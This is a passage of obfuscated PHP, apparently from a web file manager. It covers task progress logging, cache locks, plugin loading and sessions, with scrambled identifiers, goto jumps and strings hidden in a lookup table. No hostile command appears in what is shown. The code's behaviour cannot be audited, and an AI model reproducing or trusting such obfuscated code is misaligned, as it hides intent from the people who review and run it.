$ÂŠÂêË©, $»úùŞêÂ, $Êà²æ©) { $ÔÌ—£†î =& $_SERVER[ˆö¿ÚÌ¼]; $Ï¦µ¸ıÙ =& $this->task; $Ï¦µ¸ıÙ[$ÔÌ—£†î[1840]] = $Ï¦µ¸ıÙ[$ÔÌ—£†î[1839]]; $Ï¦µ¸ıÙ[$ÔÌ—£†î[1841]] = $ÔÌ—£†î[12]; unset($Ï¦µ¸ıÙ[$ÔÌ—£†î[1810]]); if ($»úùŞêÂ == $Ï¦µ¸ıÙ[$ÔÌ—£†î[1837]]) { $Ï¦µ¸ıÙ[$ÔÌ—£†î[1843]] += $Ï¦µ¸ıÙ[$ÔÌ—£†î[1839]]; $Ï¦µ¸ıÙ[$ÔÌ—£†î[1844]] = $Ï¦µ¸ıÙ[$ÔÌ—£†î[1843]]; $Óé¹·ìç = 1; if (isset($Ï¦µ¸ıÙ[$ÔÌ—£†î[1850]]) && $Ï¦µ¸ıÙ[$ÔÌ—£†î[1850]] == $‰³²©‚“) { $Óé¹·ìç = 0; } $this->update($Óé¹·ìç); } else { $this->update(); $Ï¦µ¸ıÙ[$ÔÌ—£†î[1840]] = 0; } Cache::remove($Ï¦µ¸ıÙ[$ÔÌ—£†î[478]] . $ÔÌ—£†î[1853]); self::log($ÔÌ—£†î[1856] . $‰³²©‚“ . $ÔÌ—£†î[73] . $ÂŠÂêË© . $ÔÌ—£†î[288] . $»úùŞêÂ . $ÔÌ—£†î[1857] . $Ï¦µ¸ıÙ[$ÔÌ—£†î[1837]]); } public function updateFileEnd($àÌÜıš¡, $ôÈı¼Óå) { $Ÿ—×‰È =& $_SERVER[ˆö¿ÚÌ¼]; $°ôÌ”™è =& $this->task; $°ôÌ”™è[$Ÿ—×‰È[1837]] = $àÌÜıš¡; $°ôÌ”™è[$Ÿ—×‰È[1839]] = $ôÈı¼Óå; $°ôÌ”™è[$Ÿ—×‰È[1843]] += $ôÈı¼Óå; $°ôÌ”™è[$Ÿ—×‰È[1844]] = $°ôÌ”™è[$Ÿ—×‰È[1843]]; $this->update(1); self::log($Ÿ—×‰È[1858] . $àÌÜıš¡); } public function sourceModelCopy($ïÁá©ñ¨) { $¸•«Áõ =& $_SERVER[ˆö¿ÚÌ¼]; $ĞŞÎÙ´— = $ïÁá©ñ¨[0]; $À°‘… = $ïÁá©ñ¨[1]; $ÜÇ¯ÉÎ¶ =& $this->task; $this->sourceModelCopyFlag = !0; $Å¬§§×Ğ = 0; switch ($ĞŞÎÙ´—) { case $¸•«Áõ[652]: $Å¬§§×Ğ = 1; break; case $¸•«Áõ[655]: $ÜÇ¯ÉÎ¶[$¸•«Áõ[1837]] = $À°‘…[$¸•«Áõ[32]]; break; case $¸•«Áõ[657]: $Å¬§§×Ğ = intval($ïÁá©ñ¨[$¸•«Áõ[459]] * 0.4); break; case $¸•«Áõ[659]: $Å¬§§×Ğ = intval($ïÁá©ñ¨[$¸•«Áõ[459]] * 0.2); break; case $¸•«Áõ[661]: $Å¬§§×Ğ = intval($ïÁá©ñ¨[$¸•«Áõ[459]] * 0.4); break; } $this->update($Å¬§§×Ğ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ùã¢æšº, $æ°ãÃ¯í) { $®àŒú“™ =& $_SERVER[ˆö¿ÚÌ¼]; $this->sourceModelCopyFlag = !0; $Å²§€äï = 1; if (isset($ùã¢æšº[$®àŒú“™[82]])) { $Å²§€äï = $ùã¢æšº[$®àŒú“™[82]][$®àŒú“™[80]]; $Å²§€äï = $Å²§€äï + $ùã¢æšº[$®àŒú“™[82]][$®àŒú“™[81]] + 1; } $this->update($Å²§€äï); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÓºÀÑò¹) { $this->sourceRemove($ÓºÀÑò¹, !1); } public function curlProgress($©ææÓËÛ, $¿Ü¡­¬, $îè™«¸™, $®şÈ˜», $ûŞÆ½‘¨) { $şÑ—¤—ï =& $_SERVER[ˆö¿ÚÌ¼]; $òï–¶Îè =& $this->task; if ($ûŞÆ½‘¨ > 0) { $òï–¶Îè[$şÑ—¤—ï[1156]] = $şÑ—¤—ï[1859]; $òï–¶Îè[$şÑ—¤—ï[1841]] = $şÑ—¤—ï[110]; if ($òï–¶Îè[$şÑ—¤—ï[1839]]) { $òï–¶Îè[$şÑ—¤—ï[1840]] = $ûŞÆ½‘¨; } if ($òï–¶Îè[$şÑ—¤—ï[1842]]) { $òï–¶Îè[$şÑ—¤—ï[1840]] = $ûŞÆ½‘¨ + $òï–¶Îè[$şÑ—¤—ï[1842]]; } } else { if ($îè™«¸™ > 0) { if ($òï–¶Îè[$şÑ—¤—ï[1839]] == $¿Ü¡­¬) { $òï–¶Îè[$şÑ—¤—ï[1840]] = $îè™«¸™; $òï–¶Îè[$şÑ—¤—ï[1156]] = $şÑ—¤—ï[1860]; $òï–¶Îè[$şÑ—¤—ï[1841]] = $şÑ—¤—ï[1293]; } } } $this->update(); } public function curlProgressStart($ÅŞŞ‡Œ) { } public function curlProgressEnd($™æöçŠ¹) { $ØÑû³ö™ =& $_SERVER[ˆö¿ÚÌ¼]; $ç¹¼¢¹‡ =& $this->task; $”–§¥Üæ = curl_getinfo($™æöçŠ¹); $‰õß€ùÁ = $”–§¥Üæ[$ØÑû³ö™[1861]]; if ($‰õß€ùÁ == -1) { $‰õß€ùÁ = $”–§¥Üæ[$ØÑû³ö™[1862]]; } if ($ç¹¼¢¹‡[$ØÑû³ö™[1841]] == $ØÑû³ö™[110] && $‰õß€ùÁ) { $ç¹¼¢¹‡[$ØÑû³ö™[1842]] += $‰õß€ùÁ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $à«¾È¯È =& $_SERVER[ˆö¿ÚÌ¼]; $Å÷„Ğş¡ =& $this->task; $Å÷„Ğş¡[$à«¾È¯È[1863]] = 1; Hook::bind($à«¾È¯È[1831], array($this, $à«¾È¯È[1864])); Hook::bind($à«¾È¯È[1833], array($this, $à«¾È¯È[1865])); Hook::bind($à«¾È¯È[1835], array($this, $à«¾È¯È[1866])); } protected function endAfter() { $ù¬ÑÀ–Ö =& $_SERVER[ˆö¿ÚÌ¼]; Hook::unbind($ù¬ÑÀ–Ö[1831], array($this, $ù¬ÑÀ–Ö[1864])); Hook::unbind($ù¬ÑÀ–Ö[1833], array($this, $ù¬ÑÀ–Ö[1865])); Hook::unbind($ù¬ÑÀ–Ö[1835], array($this, $ù¬ÑÀ–Ö[1866])); } public function progressStart($‹ëÀ‹«Ò) { $æáÑ‹ =& $_SERVER[ˆö¿ÚÌ¼]; $ƒ¬ÑÙ‹³ = curl_getinfo($‹ëÀ‹«Ò); self::log($æáÑ‹[1867] . $ƒ¬ÑÙ‹³[$æáÑ‹[385]]); self::valueSet($this->task[$æáÑ‹[478]], $this->task); } public function progressEnd($Ìõâ™à·) { $Ì¢ªóı =& $_SERVER[ˆö¿ÚÌ¼]; self::log($Ì¢ªóı[1868] . $this->task[$Ì¢ªóı[478]]); $this->end(); } public function progress($ŞŒËó , $˜ñüå€ö, $ÚÇ¿¦ö, $ûüËò¦–, $ùËÜ¬üü) { $õˆ®”÷ =& $_SERVER[ˆö¿ÚÌ¼]; $²ãä¶®è =& $this->task; if ($ùËÜ¬üü > 0) { $²ãä¶®è[$õˆ®”÷[1154]] = $²ãä¶®è[$õˆ®”÷[1154]] == 0 ? $ûüËò¦– : $²ãä¶®è[$õˆ®”÷[1154]]; $²ãä¶®è[$õˆ®”÷[1786]] = $ùËÜ¬üü; } else { if ($ÚÇ¿¦ö > 0) { $²ãä¶®è[$õˆ®”÷[1154]] = $²ãä¶®è[$õˆ®”÷[1154]] == 0 ? $˜ñüå€ö : $²ãä¶®è[$õˆ®”÷[1154]]; $²ãä¶®è[$õˆ®”÷[1786]] = $ÚÇ¿¦ö; } } $this->update(); self::log("\x70\162\x6f\x67\x72\x65\163\163\110\164\x74\160\x3a\x64\x6f\167\156\x3a{$ÚÇ¿¦ö}\57{$˜ñüå€ö}\x3b\x20\165\x70\x6c\x6f\x61\144\72{$ùËÜ¬üü}\x2f{$ûüËò¦–}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¦•—Ÿ, $ü¬¶¡ˆö = '', $øŸÈ˜±û = 0, $äÃÓ¼²× = '') { $ì‘ıì¡Â =& $_SERVER[ˆö¿ÚÌ¼]; $äÃÓ¼²× = $äÃÓ¼²× ? $äÃÓ¼²× : ($ü¬¶¡ˆö ? $ü¬¶¡ˆö : $¦•—Ÿ); $À‰šİÅ = new Task($¦•—Ÿ, $ü¬¶¡ˆö, $øŸÈ˜±û, $äÃÓ¼²×); $GLOBALS[$ì‘ıì¡Â[1869] . $¦•—Ÿ] = new TaskLog($ì‘ıì¡Â[1768], $À‰šİÅ, $äÃÓ¼²×); return $À‰šİÅ; } public function __construct($ÆÀ™¬Øê = '', $² ŠÔßÂ = '', $‘îÓ¸Ùç = '') { $²üçéƒÒ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ÆÀ™¬Øê) { $ÆÀ™¬Øê = $²üçéƒÒ[1768]; } $öÍÛ«æ² = $ÆÀ™¬Øê . $²üçéƒÒ[465] . rand_string(10); if (!$‘îÓ¸Ùç) { $‘îÓ¸Ùç = $ÆÀ™¬Øê . $²üçéƒÒ[53] . $‘îÓ¸Ùç; } switch ($ÆÀ™¬Øê) { case $²üçéƒÒ[1768]: if (!$² ŠÔßÂ || !$² ŠÔßÂ->task) { return echoLog($ÆÀ™¬Øê . $²üçéƒÒ[1870]); } $ĞÌ¥á–Á = $² ŠÔßÂ; $öÍÛ«æ² = $ĞÌ¥á–Á->task[$²üçéƒÒ[478]]; $ÆÀ™¬Øê = $ĞÌ¥á–Á->task[$²üçéƒÒ[478]]; if (!$ĞÌ¥á–Á->task[$²üçéƒÒ[1673]]) { $ĞÌ¥á–Á->task[$²üçéƒÒ[1673]] = $‘îÓ¸Ùç ? $‘îÓ¸Ùç : $ÆÀ™¬Øê; } break; case $²üçéƒÒ[1871]: if (!$² ŠÔßÂ) { return echoLog($ÆÀ™¬Øê . $²üçéƒÒ[1872]); } $í¼ÑÜ” = is_string($² ŠÔßÂ) ? array($² ŠÔßÂ) : $² ŠÔßÂ; $ĞÌ¥á–Á = new TaskFileTransfer($öÍÛ«æ², $ÆÀ™¬Øê, 0, $‘îÓ¸Ùç ? $‘îÓ¸Ùç : $í¼ÑÜ”[0]); foreach ($í¼ÑÜ” as $ºìÆ™ûü) { $ĞÌ¥á–Á->addPath($ºìÆ™ûü); } break; case $²üçéƒÒ[391]: if (!$² ŠÔßÂ) { return echoLog($ÆÀ™¬Øê . $²üçéƒÒ[1872]); } $í¼ÑÜ” = is_string($² ŠÔßÂ) ? array($² ŠÔßÂ) : $² ŠÔßÂ; $ĞÌ¥á–Á = new TaskZip($öÍÛ«æ², $ÆÀ™¬Øê, 0, $‘îÓ¸Ùç ? $‘îÓ¸Ùç : $í¼ÑÜ”[0]); foreach ($í¼ÑÜ” as $ºìÆ™ûü) { $ĞÌ¥á–Á->addPath($ºìÆ™ûü); } break; case $²üçéƒÒ[1313]: if (!$² ŠÔßÂ) { return echoLog($ÆÀ™¬Øê . $²üçéƒÒ[1872]); } $ĞÌ¥á–Á = new TaskUnZip($öÍÛ«æ², $ÆÀ™¬Øê, 0, $‘îÓ¸Ùç ? $‘îÓ¸Ùç : $² ŠÔßÂ); if ($² ŠÔßÂ) { $ĞÌ¥á–Á->addFile($² ŠÔßÂ); } break; case $²üçéƒÒ[152]: $ĞÌ¥á–Á = new TaskHttp($öÍÛ«æ², $ÆÀ™¬Øê); break; default: return; break; } $this->task = $ĞÌ¥á–Á; $this->taskID = $öÍÛ«æ²; Hook::bind($²üçéƒÒ[1806], array($this, $²üçéƒÒ[1873])); Hook::bind($²üçéƒÒ[1808], array($this, $²üçéƒÒ[1874])); Hook::bind($²üçéƒÒ[1802], array($this, $²üçéƒÒ[1875])); echoLog($²üçéƒÒ[1876] . $ĞÌ¥á–Á->task[$²üçéƒÒ[1673]]); } public function __destruct() { $this->end(); } public function end($­ùí‡¢ = '') { $µïèµ²Ú =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($­ùí‡¢); $this->task = !1; $this->taskID = !1; Hook::unbind($µïèµ²Ú[1806], array($this, $µïèµ²Ú[1873])); Hook::unbind($µïèµ²Ú[1808], array($this, $µïèµ²Ú[1874])); Hook::unbind($µïèµ²Ú[1802], array($this, $µïèµ²Ú[1875])); } public function taskUpdate($×Ää›§Æ) { $›îˆ‡¼» =& $_SERVER[ˆö¿ÚÌ¼]; if (!$×Ää›§Æ || $this->taskID != $×Ää›§Æ[$›îˆ‡¼»[478]]) { return; } $²“Ş”±¿ = 20; $ë­Æâ—ä = intval($×Ää›§Æ[$›îˆ‡¼»[1787]] * $²“Ş”±¿); $¹áˆ“ê¯ = $›îˆ‡¼»[176] . str_repeat($›îˆ‡¼»[518], $ë­Æâ—ä) . $›îˆ‡¼»[1105] . str_repeat($›îˆ‡¼»[53], $²“Ş”±¿ - $ë­Æâ—ä) . $›îˆ‡¼»[178]; $Û·¨›«Ÿ = $¹áˆ“ê¯ . sprintf($›îˆ‡¼»[1877], $×Ää›§Æ[$›îˆ‡¼»[1787]] * 100) . $›îˆ‡¼»[1878]; $¿èîÜ£Õ = $Û·¨›«Ÿ . $×Ää›§Æ[$›îˆ‡¼»[1786]] . $›îˆ‡¼»[8] . $×Ää›§Æ[$›îˆ‡¼»[1154]] . LNG($›îˆ‡¼»[1879]); $ñ¢Ú•İ = $›îˆ‡¼»[12]; if ($×Ää›§Æ[$›îˆ‡¼»[1863]]) { $¿èîÜ£Õ = $Û·¨›«Ÿ . size_format($×Ää›§Æ[$›îˆ‡¼»[1786]]) . $›îˆ‡¼»[8] . size_format($×Ää›§Æ[$›îˆ‡¼»[1154]]); $ñ¢Ú•İ = size_format($×Ää›§Æ[$›îˆ‡¼»[1788]]) . $›îˆ‡¼»[1880]; } if ($×Ää›§Æ[$›îˆ‡¼»[1156]]) { $×Ää›§Æ[$›îˆ‡¼»[1837]] = $×Ää›§Æ[$›îˆ‡¼»[1156]] . $›îˆ‡¼»[53] . $×Ää›§Æ[$›îˆ‡¼»[1837]]; } if ($×Ää›§Æ[$›îˆ‡¼»[1837]]) { $áÏà›ÛÙ = $›îˆ‡¼»[12]; if ($×Ää›§Æ[$›îˆ‡¼»[1839]]) { $áÏà›ÛÙ = $›îˆ‡¼»[50] . size_format($×Ää›§Æ[$›îˆ‡¼»[1840]]) . $›îˆ‡¼»[8] . size_format($×Ää›§Æ[$›îˆ‡¼»[1839]]); } $ñ¢Ú•İ .= $×Ää›§Æ[$›îˆ‡¼»[1837]] . $áÏà›ÛÙ; } if ($×Ää›§Æ[$›îˆ‡¼»[848]] && !$×Ää›§Æ[$›îˆ‡¼»[1839]]) { $ñ¢Ú•İ .= $›îˆ‡¼»[53] . size_format($×Ää›§Æ[$›îˆ‡¼»[1844]]) . $›îˆ‡¼»[8] . size_format($×Ää›§Æ[$›îˆ‡¼»[848]]); } echoLog($¿èîÜ£Õ . $›îˆ‡¼»[53] . $ñ¢Ú•İ, !0); } public function taskEnd($ÕÅ€×ß‰) { $ÄÇÍÅß =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ÕÅ€×ß‰ || $this->taskID != $ÕÅ€×ß‰[$ÄÇÍÅß[478]]) { return; } $…Ñ§·‰ = $ÕÅ€×ß‰ ? LNG($ÄÇÍÅß[1881]) . $ÄÇÍÅß[4] . $ÕÅ€×ß‰[$ÄÇÍÅß[1786]] . $ÄÇÍÅß[8] . $ÕÅ€×ß‰[$ÄÇÍÅß[1154]] . LNG($ÄÇÍÅß[1879]) . $ÄÇÍÅß[74] : $ÄÇÍÅß[12]; echoLog($ÄÇÍÅß[1882] . $ÕÅ€×ß‰[$ÄÇÍÅß[1673]] . ($ÕÅ€×ß‰[$ÄÇÍÅß[538]] ? $ÄÇÍÅß[74] . $ÕÅ€×ß‰[$ÄÇÍÅß[538]] : $ÄÇÍÅß[12]) . $ÄÇÍÅß[74] . $…Ñ§·‰ . $ÄÇÍÅß[1883] . sprintf($ÄÇÍÅß[942], timeFloat() - $ÕÅ€×ß‰[$ÄÇÍÅß[1789]]) . $ÄÇÍÅß[1801]); $this->end(); } public function taskKill($…¬¾‘ó) { $äşÊëİ€ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$…¬¾‘ó || $this->taskID != $…¬¾‘ó[$äşÊëİ€[478]]) { return; } echoLog($äşÊëİ€[1884] . $…¬¾‘ó[$äşÊëİ€[1673]]); } } goto A±óõò¥°; aÈÏÑ—¨äˆ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ù®ºù«Ó =& $_SERVER[ˆö¿ÚÌ¼]; $µ¦”‡¶‚ = $GLOBALS[$ù®ºù«Ó[6]][$ù®ºù«Ó[427]]; self::$cachePath = $µ¦”‡¶‚[$ù®ºù«Ó[233]][$ù®ºù«Ó[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($şò‹Í–ì, $ã Â½Ë = 0) { $™ç¯àÁ¿ =& $_SERVER[ˆö¿ÚÌ¼]; $ø·Ç£± = microtime(!0); $ùúÈÕ˜¡ = $ø·Ç£± + $ã Â½Ë + 0.0001; $ÚÉøÀ = rtrim(self::$cachePath, $™ç¯àÁ¿[8]) . $™ç¯àÁ¿[955] . md5($şò‹Í–ì) . $™ç¯àÁ¿[952]; if (file_exists($ÚÉøÀ) && filemtime($ÚÉøÀ) && filemtime($ÚÉøÀ) < time() - 10) { @unlink($ÚÉøÀ); } do { if (file_exists($ÚÉøÀ)) { cacheLockWait(); continue; } $İÈÙÂòã = fopen($ÚÉøÀ, $™ç¯àÁ¿[956]); if (!$İÈÙÂòã) { return !1; } $Øå°½™À = flock($İÈÙÂòã, LOCK_EX | LOCK_NB); self::$caches[$şò‹Í–ì] = array($™ç¯àÁ¿[957] => $İÈÙÂòã, $™ç¯àÁ¿[233] => $ÚÉøÀ); fwrite($İÈÙÂòã, $ùúÈÕ˜¡); clearstatcache(); if ($İÈÙÂòã && $Øå°½™À) { return !0; } cacheLockWait(); } while (microtime(!0) < $ùúÈÕ˜¡); $this->unlock($şò‹Í–ì); return !1; } public function lockGet($ïÜ—îíÌ) { $ºÒÜ®Ö =& $_SERVER[ˆö¿ÚÌ¼]; $»…°¥±² = rtrim(self::$cachePath, $ºÒÜ®Ö[8]) . $ºÒÜ®Ö[955] . md5($ïÜ—îíÌ) . $ºÒÜ®Ö[952]; return file_exists($»…°¥±²); } public function unlock($Å›½Âİü) { $ãëÎÅŞú =& $_SERVER[ˆö¿ÚÌ¼]; $Ò£®€ÎÚ = self::$caches[$Å›½Âİü]; if (!$Ò£®€ÎÚ) { return; } @flock($Ò£®€ÎÚ[$ãëÎÅŞú[957]], LOCK_UN); @fclose($Ò£®€ÎÚ[$ãëÎÅŞú[957]]); @unlink($Ò£®€ÎÚ[$ãëÎÅŞú[233]]); unset(self::$caches[$Å›½Âİü]); } } class CacheLockRedis { public function lock($ÜöÏÉÆø, $€¸ÕàæÓ = 10) { $Öšßğ«ã = Cache::init(); $À¸ˆ©‚ = microtime(!0) + $€¸ÕàæÓ; while (microtime(!0) < $À¸ˆ©‚) { $ï‹Ëæ™ = $Öšßğ«ã->get($ÜöÏÉÆø); if (!$ï‹Ëæ™) { $‡é¯ŒÔŞ = $Öšßğ«ã->setLock($ÜöÏÉÆø, $À¸ˆ©‚, $€¸ÕàæÓ); if ($‡é¯ŒÔŞ) { return !0; } } else { if ($ï‹Ëæ™ < microtime(!0)) { $Öšßğ«ã->set($ÜöÏÉÆø, $À¸ˆ©‚, $€¸ÕàæÓ * 2); if ($Öšßğ«ã->get($ÜöÏÉÆø) === $ï‹Ëæ™) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($„°ŠİÎ) { return Cache::init()->get($„°ŠİÎ); } public function unlock($¦¨çŸä) { return Cache::init()->remove($¦¨çŸä); } } class CacheLockMemcached { public function lock($ı¤£‡ëŸ, $Àç‘ŸÓÊ = 0) { $Å¡òšğÑ = Cache::init(); $ô¬òŞÕÑ = microtime(!0) + $Àç‘ŸÓÊ; while (microtime(!0) < $ô¬òŞÕÑ) { $ş¶È¯œ— = $Å¡òšğÑ->get($ı¤£‡ëŸ); if (!$ş¶È¯œ— || $ş¶È¯œ— < microtime(!0)) { $ÊÓ¦¸ü¡ = $Å¡òšğÑ->handle->add($ı¤£‡ëŸ, $ô¬òŞÕÑ, $Àç‘ŸÓÊ); if ($ÊÓ¦¸ü¡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($çó½Š£¼) { return Cache::init()->get($çó½Š£¼); } public function unlock($ŒÆ¸»ù¬) { return Cache::init()->remove($ŒÆ¸»ù¬); } } goto A“·Èô®ù; bÈš•º˜ÜÃ: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x70\x6c\165\147\151\156\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\x73\164\x61\164\165\x73", "\162\x65\147\x69\x65\163\x74", "\143\157\x6e\x66\151\x67"); public function loadList($é‘éÚ¦² = false) { $ÛÂÏò”© = array_to_keyvalue($this->listData(), $_SERVER[ˆö¿ÚÌ¼][32]); if ($é‘éÚ¦²) { return $ÛÂÏò”©[$é‘éÚ¦²]; } return $ÛÂÏò”©; } public function init() { $úûä¾„ã =& $_SERVER[ˆö¿ÚÌ¼]; Hook::trigger($úûä¾„ã[2110]); $ß„µ•™Ù = $this->loadPluginList(); foreach ($ß„µ•™Ù as $—©Í‡Öœ => $°¯´Õ«›) { $µ¢äì¥³ = $this->appAllow($—©Í‡Öœ, $°¯´Õ«›); if (!$µ¢äì¥³) { continue; } foreach ($°¯´Õ«›[$úûä¾„ã[2111]] as $ãâÔäóœ => $ÁíÀÕÑ) { Hook::bind($ãâÔäóœ, $ÁíÀÕÑ); } } Hook::trigger($úûä¾„ã[2112]); Hook::trigger(ACTION); } public function appAllow($Åªùë«, $Ÿ¹üªéñ, $ûöïœ¥æ = true) { $°­Ôªå =& $_SERVER[ˆö¿ÚÌ¼]; $¬—š‹Ş = PLUGIN_DIR . $Åªùë« . $°­Ôªå[2113]; if (!is_array($Ÿ¹üªéñ) || !is_array($Ÿ¹üªéñ[$°­Ôªå[2111]]) || $Ÿ¹üªéñ[$°­Ôªå[835]] != 1 || !is_file($¬—š‹Ş)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$°­Ôªå[6]][$°­Ôªå[2114]] || !$GLOBALS[$°­Ôªå[6]][$°­Ôªå[2115]]) { return !0; } $ÆËŞ…²ê = explode($°­Ôªå[50], strtolower($GLOBALS[$°­Ôªå[6]][$°­Ôªå[2115]])); return in_array(strtolower($Åªùë«), $ÆËŞ…²ê) ? !1 : !0; } if ($ûöïœ¥æ && !Action($°­Ôªå[2116])->checkAuth($Åªùë«)) { return !1; } return !0; } public function unInstall($æì õÖË) { $÷ü¬ª =& $_SERVER[ˆö¿ÚÌ¼]; $²“Ò¾˜ = $this->loadList($æì õÖË); if (file_exists(PLUGIN_DIR . $æì õÖË)) { Hook::apply($æì õÖË . $÷ü¬ª[2117]); } $this->remove($²“Ò¾˜[$÷ü¬ª[478]]); } public function changeStatus($èÀúó³, $ñÍ£“ù¦) { $Ã…èÌŠ¯ =& $_SERVER[ˆö¿ÚÌ¼]; $ÚíÑ˜¬ = $this->loadList($èÀúó³); if ($ñÍ£“ù¦) { Hook::apply($èÀúó³ . $Ã…èÌŠ¯[2118]); } $this->update($ÚíÑ˜¬[$Ã…èÌŠ¯[478]], array($Ã…èÌŠ¯[2119] => $ñÍ£“ù¦)); } public function appRegist($¾Òß–®Æ, $ÑÔûÜúü) { $ü¥Å´ù =& $_SERVER[ˆö¿ÚÌ¼]; $ËˆŸ£ÀÌ = $this->loadList($¾Òß–®Æ); if ($ËˆŸ£ÀÌ) { $this->update($ËˆŸ£ÀÌ[$ü¥Å´ù[478]], array($ü¥Å´ù[2111] => $ÑÔûÜúü)); } else { $±à„ê—ç = array($ü¥Å´ù[32] => $¾Òß–®Æ, $ü¥Å´ù[2111] => $ÑÔûÜúü, $ü¥Å´ù[835] => 0, $ü¥Å´ù[6] => $this->getConfigDefault($¾Òß–®Æ)); $this->insert($±à„ê—ç); } } public function getConfigDefault($ô›«ò·á) { $³½”ˆ§Â =& $_SERVER[ˆö¿ÚÌ¼]; $ÍšŠİ³Ø = array(); $¢æÛì¼¦ = $this->getPackageJson($ô›«ò·á); if (!$¢æÛì¼¦ && is_array($¢æÛì¼¦[$³½”ˆ§Â[2120]])) { return $ÍšŠİ³Ø; } foreach ($¢æÛì¼¦[$³½”ˆ§Â[2120]] as $±Ö­²©” => $ö–ôºÆˆ) { if (!isset($ö–ôºÆˆ[$³½”ˆ§Â[453]]) || isset($ÍšŠİ³Ø[$±Ö­²©”])) { continue; } $ÍšŠİ³Ø[$±Ö­²©”] = $ö–ôºÆˆ[$³½”ˆ§Â[453]]; } return $ÍšŠİ³Ø; } public function getPackageJson($§îõ…É) { return Hook::apply($§îõ…É . $_SERVER[ˆö¿ÚÌ¼][2121]); } public function getConfig($°€éš˜Ò, $ÀÒ³İŒ = false) { $úğ­Á» =& $_SERVER[ˆö¿ÚÌ¼]; $Ñù±Õßò = array(); $´š¬œì = $this->loadList($°€éš˜Ò); if ($´š¬œì && is_array($´š¬œì[$úğ­Á»[6]])) { $Ñù±Õßò = $´š¬œì[$úğ­Á»[6]]; } if (!$Ñù±Õßò || $ÀÒ³İŒ) { $Ñù±Õßò = $this->getConfigDefault($°€éš˜Ò); } return $Ñù±Õßò; } public function setConfig($„¤¯“ë¬, $òÖä¢”Ó = false) { $¨öì±Úè =& $_SERVER[ˆö¿ÚÌ¼]; $à˜ãÑÌ = $this->loadList($„¤¯“ë¬); if (!$à˜ãÑÌ) { return !1; } $İåÖ®íë = $à˜ãÑÌ[$¨öì±Úè[6]]; if ($òÖä¢”Ó == !1) { $İåÖ®íë = array(); $òÖä¢”Ó = $this->getConfigDefault($„¤¯“ë¬); } foreach ($òÖä¢”Ó as $©í³±©Ç => $Ò¢„ÈÊ§) { $İåÖ®íë[$©í³±©Ç] = is_string($Ò¢„ÈÊ§) ? trim($Ò¢„ÈÊ§) : $Ò¢„ÈÊ§; } $this->update($à˜ãÑÌ[$¨öì±Úè[478]], array($¨öì±Úè[6] => $İåÖ®íë)); } public function viewList() { $³öäÖ¿ğ =& $_SERVER[ˆö¿ÚÌ¼]; $ï¡‹ãü = $this->loadList(); $this->pluginScan($ï¡‹ãü); $ï¡‹ãü = $this->loadPluginList(); $‚¾«¤ÜØ = array(); foreach ($ï¡‹ãü as $¶»¹¸Öä => $ÜÒöñøş) { $ÍÂÌÎ‚ = $ÜÒöñøş; unset($ÜÒöñøş[$³öäÖ¿ğ[2111]], $ÜÒöñøş[$³öäÖ¿ğ[6]]); $ÈÊÂôü = PLUGIN_DIR . $ÜÒöñøş[$³öäÖ¿ğ[32]] . $³öäÖ¿ğ[2113]; if (!is_file($ÈÊÂôü)) { continue; } $³ó¬¯Èø = Hook::apply($ÜÒöñøş[$³öäÖ¿ğ[32]] . $³öäÖ¿ğ[2121]); if (!is_array($³ó¬¯Èø)) { continue; } $‚¾«¤ÜØ[$¶»¹¸Öä] = array_merge($ÜÒöñøş, $³ó¬¯Èø); if ($ÍÂÌÎ‚[$³öäÖ¿ğ[6]][$³öäÖ¿ğ[1698]] != $³ó¬¯Èø[$³öäÖ¿ğ[1672]]) { Hook::apply($ÜÒöñøş[$³öäÖ¿ğ[32]] . $³öäÖ¿ğ[2118]); $ÍÂÌÎ‚[$³öäÖ¿ğ[6]][$³öäÖ¿ğ[1698]] = $³ó¬¯Èø[$³öäÖ¿ğ[1672]]; $this->update($ÜÒöñøş[$³öäÖ¿ğ[478]], array($³öäÖ¿ğ[6] => $ÍÂÌÎ‚[$³öäÖ¿ğ[6]])); } } return $‚¾«¤ÜØ; } private function loadPluginList() { $Šğá©˜ =& $_SERVER[ˆö¿ÚÌ¼]; $ŸÒŸÂî— = $this->loadList(); if (strtolower(MOD) == $Šğá©˜[2122]) { return $ŸÒŸÂî—; } $ˆœ„úÖç = Hook::trigger($Šğá©˜[2123], $ŸÒŸÂî—); if ($ŸÒŸÂî— && !$ˆœ„úÖç) { die; } return $ˆœ„úÖç ? $ˆœ„úÖç : $ŸÒŸÂî—; } private function pluginScan($—¾Ú˜Â) { $‚ôŸÕ‡÷ =& $_SERVER[ˆö¿ÚÌ¼]; recursion_dir(PLUGIN_DIR, $©ïÖÍ, $Ú½ò”°ı, 0); foreach ($©ïÖÍ as $€µ’ˆ†) { $ùÀé‚¿ö = get_path_this($€µ’ˆ†); if (isset($—¾Ú˜Â[$ùÀé‚¿ö]) || !file_exists($€µ’ˆ† . $‚ôŸÕ‡÷[2124]) || !file_exists($€µ’ˆ† . $‚ôŸÕ‡÷[2113])) { continue; } Hook::apply($ùÀé‚¿ö . $‚ôŸÕ‡÷[2118]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\x6d\x5f\x73\145\163\163\151\x6f\156"; public function get($Ş¡æø³‡) { $ó²İÆ² =& $_SERVER[ˆö¿ÚÌ¼]; $‚ãè°îª = $this->where(array($ó²İÆ²[2125] => $Ş¡æø³‡))->find(); if (!is_array($‚ãè°îª)) { return !1; } return $‚ãè°îª[$ó²İÆ²[171]]; } public function set($äÀƒ¬§Á, $¿ü«¦Ä, $¿ õ£†Ù = 3600) { $ùŒŞ­¾· =& $_SERVER[ˆö¿ÚÌ¼]; $æª°×’« = array($ùŒŞ­¾·[2125] => $äÀƒ¬§Á, 